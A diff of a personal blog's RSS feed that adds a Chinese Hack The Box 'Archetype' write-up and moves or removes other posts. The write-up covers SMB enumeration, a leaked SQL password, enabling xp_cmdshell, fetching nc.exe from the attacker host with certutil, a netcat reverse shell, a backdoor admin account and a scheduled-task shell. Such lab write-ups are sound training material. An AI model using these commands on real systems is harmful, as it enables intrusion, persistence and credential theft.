@@ -12,7 +12,7 @@
     
     <copyright>本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！</copyright>
     
-    <lastBuildDate>Sun, 22 Mar 2026 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Mon, 23 Mar 2026 00:00:00 +0000</lastBuildDate>
     
     
     <atom:link href="https://test692618.github.io/index.xml" rel="self" type="application/rss&#43;xml" />
@@ -22,11 +22,168 @@
     
 
     <item>
+      <title>htb-Archetype</title>
+      <link>https://test692618.github.io/post/htb/htb%E6%89%93%E9%9D%B6-archetype/</link>
+      <pubDate>Mon, 23 Mar 2026 00:00:00 &#43;0000</pubDate>
+      <author>knock_s@foxmial.com (L)</author>
+      <guid>https://test692618.github.io/post/htb/htb%E6%89%93%E9%9D%B6-archetype/</guid>
+      <description>
+        <![CDATA[<h1>htb-Archetype</h1><p>作者：L（knock_s@foxmial.com）</p>
+        
+          <h2 id="端口信息">
+<a class="header-anchor" href="#%e7%ab%af%e5%8f%a3%e4%bf%a1%e6%81%af"></a>
+端口信息
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT     STATE SERVICE      VERSION
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds Windows Server <span class="m">2019</span> Standard <span class="m">17763</span> microsoft-ds
+</span></span><span class="line"><span class="cl">1433/tcp open  ms-sql-s     Microsoft SQL Server <span class="m">2017</span> 14.00.1000.00<span class="p">;</span> RTM
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ms-sql-info: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   10.129.11.97:1433: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Version: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>       name: Microsoft SQL Server <span class="m">2017</span> RTM
+</span></span><span class="line"><span class="cl"><span class="p">|</span>       number: 14.00.1000.00
+</span></span><span class="line"><span class="cl"><span class="p">|</span>       Product: Microsoft SQL Server <span class="m">2017</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>       Service pack level: RTM
+</span></span><span class="line"><span class="cl"><span class="p">|</span>       Post-SP patches applied: <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    TCP port: <span class="m">1433</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-12-12T00:47:39+00:00<span class="p">;</span> +4s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ms-sql-ntlm-info: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   10.129.11.97:1433: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Target_Name: ARCHETYPE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     NetBIOS_Domain_Name: ARCHETYPE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     NetBIOS_Computer_Name: ARCHETYPE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     DNS_Domain_Name: Archetype
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     DNS_Computer_Name: Archetype
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Product_Version: 10.0.17763
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-12-12T00:44:06
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2055-12-12T00:44:06
+</span></span><span class="line"><span class="cl">5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">Service Info: OSs: Windows, Windows Server <span class="m">2008</span> R2 - 2012<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2025-12-12T00:47:18
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3:1:1: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required   //表示 允许匿名/访客<span class="o">(</span>guest<span class="o">)</span>访问，且消息签名未被强制启用 <span class="o">(</span>Message signing enabled but not required<span class="o">)</span>。这是一个常见的弱点，允许无需凭证即可枚举共享资源。
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   account_used: guest
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-os-discovery: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS: Windows Server <span class="m">2019</span> Standard <span class="m">17763</span> <span class="o">(</span>Windows Server <span class="m">2019</span> Standard 6.3<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Computer name: Archetype
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS computer name: ARCHETYPE<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Workgroup: WORKGROUP<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System time: 2025-12-11T16:47:21-08:00
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 1h36m04s, deviation: 3h34m42s, median: 3s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----------------结论----------------------------
+</span></span><span class="line"><span class="cl">SMB 服务 <span class="o">(</span>端口 139, 445<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">	服务器版本与主机操作系统一致。
+</span></span><span class="line"><span class="cl">	关键发现: 允许匿名/访客<span class="o">(</span>guest<span class="o">)</span>访问，且消息签名未被强制启用 <span class="o">(</span>Message signing enabled but not required<span class="o">)</span>。这是一个常见的弱点，允许无需凭证即可枚举共享资源。
+</span></span><span class="line"><span class="cl">MSSQL 服务 <span class="o">(</span>端口 1433<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">	版本: Microsoft SQL Server <span class="m">2017</span> RTM <span class="o">(</span>14.00.1000.00<span class="o">)</span>。
+</span></span><span class="line"><span class="cl">	关键发现:
+</span></span><span class="line"><span class="cl">		服务暴露在网络上，是首要的攻击目标。
+</span></span><span class="line"><span class="cl">		ms-sql-ntlm-info 脚本成功获取了主机的域信息，表明该服务使用了Windows身份验证（集成认证）。
+</span></span><span class="line"><span class="cl">WinRM 服务 <span class="o">(</span>端口 5985<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">		运行着 Microsoft HTTPAPI。如果获取到有效的本地管理员凭据，可通过此服务进行远程命令行访问。
+</span></span><span class="line"><span class="cl">MSRPC 服务 <span class="o">(</span>端口 135<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">		Windows RPC端口，常与其他服务联动用于信息枚举或利用。
+</span></span></code></pre></div><h2 id="445端口匿名访问">
+<a class="header-anchor" href="#445%e7%ab%af%e5%8f%a3%e5%8c%bf%e5%90%8d%e8%ae%bf%e9%97%ae"></a>
+445端口匿名访问
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo smbclient -L 10.129.11.97 -N
+</span></span><span class="line"><span class="cl">sudo smbclient <span class="se">\\\\</span>10.129.11.97<span class="se">\\</span>backups -N
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//注意：建议 使用sudo启动smbclient，否则可能由于shell权限问题导致使用get XXX时下载失败。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//文件下载至本地获取账户密码，根据内容推断，为sqlserver的账户密码。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">└─$ cat prod.dtsConfig
+</span></span><span class="line"><span class="cl">&lt;DTSConfiguration&gt;
+</span></span><span class="line"><span class="cl">    &lt;DTSConfigurationHeading&gt;
+</span></span><span class="line"><span class="cl">        &lt;DTSConfigurationFileInfo <span class="nv">GeneratedBy</span><span class="o">=</span><span class="s2">&#34;...&#34;</span> <span class="nv">GeneratedFromPackageName</span><span class="o">=</span><span class="s2">&#34;...&#34;</span> <span class="nv">GeneratedFromPackageID</span><span class="o">=</span><span class="s2">&#34;...&#34;</span> <span class="nv">GeneratedDate</span><span class="o">=</span><span class="s2">&#34;20.1.2019 10:01:34&#34;</span>/&gt;
+</span></span><span class="line"><span class="cl">    &lt;/DTSConfigurationHeading&gt;
+</span></span><span class="line"><span class="cl">    &lt;Configuration <span class="nv">ConfiguredType</span><span class="o">=</span><span class="s2">&#34;Property&#34;</span> <span class="nv">Path</span><span class="o">=</span><span class="s2">&#34;\Package.Connections[Destination].Properties[ConnectionString]&#34;</span> <span class="nv">ValueType</span><span class="o">=</span><span class="s2">&#34;String&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">        &lt;ConfiguredValue&gt;Data <span class="nv">Source</span><span class="o">=</span>.<span class="p">;</span><span class="nv">Password</span><span class="o">=</span>M3g4c0rp123<span class="p">;</span>User <span class="nv">ID</span><span class="o">=</span>ARCHETYPE<span class="se">\s</span>ql_svc<span class="p">;</span>Initial <span class="nv">Catalog</span><span class="o">=</span>Catalog<span class="p">;</span><span class="nv">Provider</span><span class="o">=</span>SQLNCLI10.1<span class="p">;</span>Persist Security <span class="nv">Info</span><span class="o">=</span>True<span class="p">;</span>Auto <span class="nv">Translate</span><span class="o">=</span>False<span class="p">;</span>&lt;/ConfiguredValue&gt;
+</span></span><span class="line"><span class="cl">    &lt;/Configuration&gt;
+</span></span><span class="line"><span class="cl">&lt;/DTSConfiguration&gt;
+</span></span></code></pre></div><h2 id="使用imparket访问sqlserver数据库">
+<a class="header-anchor" href="#%e4%bd%bf%e7%94%a8imparket%e8%ae%bf%e9%97%aesqlserver%e6%95%b0%e6%8d%ae%e5%ba%93"></a>
+使用imparket访问sqlserver数据库
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo impacket-mssqlclient <span class="s1">&#39;ARCHETYPE/sql_svc&#39;</span>:M3g4c0rp123@10.129.95.187 -windows-auth
+</span></span><span class="line"><span class="cl">//注意：1.使用 引号 和 / ，eg，<span class="s1">&#39;ARCHETYPE/sql_svc&#39;</span> 否则会导致执行失败。
+</span></span><span class="line"><span class="cl">		2.使用-windows-auth参数，表示采用windows认证，否则会登录失败。
+</span></span></code></pre></div><h2 id="启用xp_cmdshell函数并反弹shell">
+<a class="header-anchor" href="#%e5%90%af%e7%94%a8xp_cmdshell%e5%87%bd%e6%95%b0%e5%b9%b6%e5%8f%8d%e5%bc%b9shell"></a>
+启用xp_cmdshell函数并反弹shell
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">EXEC sp_configure <span class="s1">&#39;show advanced options&#39;</span>, 1<span class="p">;</span> //将高级选项设置为 1（启用）
+</span></span><span class="line"><span class="cl">RECONFIGURE<span class="p">;</span>  //使配置生效
+</span></span><span class="line"><span class="cl">EXEC sp_configure <span class="s1">&#39;xp_cmdshell&#39;</span>, 1<span class="p">;</span>  //将 xp_cmdshell选项设置为 1（启用）
+</span></span><span class="line"><span class="cl">RECONFIGURE<span class="p">;</span>  //使配置生效
+</span></span><span class="line"><span class="cl">---------------------------------
+</span></span><span class="line"><span class="cl">python -m http.server <span class="m">8080</span> 攻击机器上启用http服务
+</span></span><span class="line"><span class="cl">---------------------------------
+</span></span><span class="line"><span class="cl">EXEC xp_cmdshell <span class="s1">&#39;certutil -urlcache -f http://10.10.16.XX:8080/nc.exe C:\Windows\Temp\nc.exe&#39;</span><span class="p">;</span> //将nc下载至目标机器
+</span></span><span class="line"><span class="cl">EXEC xp_cmdshell <span class="s1">&#39;C:\Windows\Temp\nc.exe 10.10.16.X 1234 -e cmd.exe&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">---------------------------------
+</span></span><span class="line"><span class="cl">sudo nc -lvvp <span class="m">1234</span> //攻击机启用监听，建议使用sudo，以防未知错误
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">扩展：此时也可尝试以下命令建立后门账户
+</span></span><span class="line"><span class="cl">EXEC xp_cmdshell <span class="s1">&#39;net user attacker P@ssw0rd! /add&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">EXEC xp_cmdshell <span class="s1">&#39;net localgroup administrators attacker /add&#39;</span><span class="p">;</span>
+</span></span></code></pre></div><h2 id="获取敏感信息">
+<a class="header-anchor" href="#%e8%8e%b7%e5%8f%96%e6%95%8f%e6%84%9f%e4%bf%a1%e6%81%af"></a>
+获取敏感信息
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">type</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 
+</span></span><span class="line"><span class="cl">	net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n! //发现账户密码
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">//ConsoleHost_history.txt 是 PowerShell 的命令历史记录文件，类似于 Linux 中的 ~/.bash_history。记录内容：记录了 sql_svc用户在 PowerShell 中执行过的所有命令。自动保存：每当用户在 PowerShell 中执行命令，该命令会自动追加到此文件。位置：存储在用户的 AppData 目录中，是用户特定的。
+</span></span></code></pre></div><h2 id="选择1利用使用计划任务反弹shell">
+<a class="header-anchor" href="#%e9%80%89%e6%8b%a91%e5%88%a9%e7%94%a8%e4%bd%bf%e7%94%a8%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1%e5%8f%8d%e5%bc%b9shell"></a>
+选择1：利用使用计划任务反弹shell
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">schtasks /create /tn <span class="s2">&#34;test1&#34;</span> /tr <span class="s2">&#34;C:\Windows\Temp\nc.exe 10.10.16.X 5555 -e cmd.exe&#34;</span> /sc minute /mo 1 /ru administrator /rp MEGACORP_4dm1n!! 
+</span></span><span class="line"><span class="cl">// 会创建一个名为 test1的计划任务。这个任务会以系统管理员（administrator）的最高权限，在后台每分钟自动执行一次以下操作.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">---------------------
+</span></span><span class="line"><span class="cl">sudo nc -lvvp 5555 //做好监听
+</span></span></code></pre></div><h2 id="选择2使用5985端口进行连接">
+<a class="header-anchor" href="#%e9%80%89%e6%8b%a92%e4%bd%bf%e7%94%a85985%e7%ab%af%e5%8f%a3%e8%bf%9b%e8%a1%8c%e8%bf%9e%e6%8e%a5"></a>
+选择2：使用5985端口进行连接
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i 目标IP -u 用户名 -p 密码 
+</span></span></code></pre></div><h2 id="完成两个flag-分别在-sql_svc和administrator账户的desktop目录下">
+<a class="header-anchor" href="#%e5%ae%8c%e6%88%90%e4%b8%a4%e4%b8%aaflag-%e5%88%86%e5%88%ab%e5%9c%a8-sql_svc%e5%92%8cadministrator%e8%b4%a6%e6%88%b7%e7%9a%84desktop%e7%9b%ae%e5%bd%95%e4%b8%8b"></a>
+完成：两个flag 分别在 sql_svc和administrator账户的desktop目录下。
+</h2>
+        
+        <hr><p>本文2026-03-23首发于<a href='https://test692618.github.io/'>HELLO WORLD</a>，最后修改于2026-03-23</p>]]>
+      </description>
+      
+        <category>HTB</category>
+      
+    </item>
+    
+    
+
+    <item>
       <title>htb-trick</title>
-      <link>https://test692618.github.io/post/htb-trick/htb-trick/</link>
+      <link>https://test692618.github.io/post/htb/htb-trick/</link>
       <pubDate>Sun, 22 Mar 2026 00:00:00 &#43;0000</pubDate>
       <author>knock_s@foxmial.com (L)</author>
-      <guid>https://test692618.github.io/post/htb-trick/htb-trick/</guid>
+      <guid>https://test692618.github.io/post/htb/htb-trick/</guid>
       <description>
         <![CDATA[<h1>htb-trick</h1><p>作者：L（knock_s@foxmial.com）</p>
         
@@ -99,7 +256,7 @@ impact-psexec工具使用
         <hr><p>本文2026-03-22首发于<a href='https://test692618.github.io/'>HELLO WORLD</a>，最后修改于2026-03-22</p>]]>
       </description>
       
-        <category>HTB-tricks</category>
+        <category>HTB</category>
       
     </item>
     
@@ -372,31 +529,6 @@ APK文件结构
 </h2><ul>
 <li>
 <p>商业银行</p>
-        
-        <hr><p>本文2024-03-12首发于<a href='https://test692618.github.io/'>HELLO WORLD</a>，最后修改于2024-03-12</p>]]>
-      </description>
-      
-        <category>经济与金融</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>经济常识</title>
-      <link>https://test692618.github.io/post/%E7%BB%8F%E6%B5%8E%E4%B8%8E%E9%87%91%E8%9E%8D%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/%E7%BB%8F%E6%B5%8E%E5%B8%B8%E8%AF%86/</link>
-      <pubDate>Tue, 12 Mar 2024 19:15:13 &#43;0000</pubDate>
-      <author>knock_s@foxmial.com (L)</author>
-      <guid>https://test692618.github.io/post/%E7%BB%8F%E6%B5%8E%E4%B8%8E%E9%87%91%E8%9E%8D%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/%E7%BB%8F%E6%B5%8E%E5%B8%B8%E8%AF%86/</guid>
-      <description>
-        <![CDATA[<h1>经济常识</h1><p>作者：L（knock_s@foxmial.com）</p>
-        
-          <h3 id="概念">
-<a class="header-anchor" href="#%e6%a6%82%e5%bf%b5"></a>
-概念
-</h3><ul>
-<li>
-<p>M0:指流通中的现金，即在单位和居民手中流通的货币总和，这里的单位指排除银行体系意外的学校、部队、机关等。M0与日常消费密切相关，其数值高代表老百姓手头宽裕、富足。</p>
         
         <hr><p>本文2024-03-12首发于<a href='https://test692618.github.io/'>HELLO WORLD</a>，最后修改于2024-03-12</p>]]>
       </description>
